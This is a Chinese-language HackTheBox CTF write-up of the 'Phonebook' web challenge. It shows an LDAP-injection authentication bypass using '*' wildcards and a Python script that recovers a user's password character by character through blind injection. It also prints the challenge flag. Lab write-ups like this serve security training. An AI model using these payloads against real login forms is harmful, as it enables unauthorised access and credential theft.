---
layout: writeup
lang: zh
title: "HackTheBox - Phonebook (LDAP 注入)"
description: "通过 LDAP 注入绕过登录验证。在用户名和密码字段中使用通配符，实现任意用户身份认证，并通过盲注逐字符枚举凭据。"
platform: "HackTheBox"
category: "Web"
difficulty: "Medium"
date: 2026-01-10
permalink: /zh/ctf-writeups/htb-web-phonebook/
---

## 题目信息

**平台：** HackTheBox
**类别：** Web
**难度：** Medium

## 侦察

应用是一个简单的登录表单。最初测试 SQL 注入无果。根据错误返回方式和 URL 结构判断，后端可能使用的是目录服务（LDAP）而非数据库。

在用户名字段中输入 `*`，随机填写密码，成功登录。LDAP 注入确认。在 LDAP 中，`*` 是通配符，可匹配任意内容。

## 认证绕过

```
username: *
password: *
```

以第一个匹配用户的身份成功登录，flag 直接可见。

## 盲注枚举凭据

进一步尝试提取实际密码，思路是用 LDAP 通配符逐字符测试：

```python
import requests
import string

url = "http://<target>/login"
charset = string.ascii_letters + string.digits + string.punctuation
password = ""

while True:
    for c in charset:
        r = requests.post(url, data={
            "username": "reese",
            "password": password + c + "*"
        })
        if "Invalid" not in r.text:
            password += c
            print(f"[+] Found so far: {password}")
            break
    else:
        break

print(f"[*] Final password: {password}")
```

响应内容的差异即可判断字符是否匹配，逐字符重建完整密码。

## Flag

```
HTB{d1rectory_h4xx0r_is_k00l}
```

## 总结

- LDAP 注入容易被忽略，测试时不要只考虑 SQL
- LDAP 中的 `*` 通配符类似于 SQL 中的 `%`
- 只要应用对正确/错误凭据返回不同响应，盲注枚举就可以有效还原完整字符串
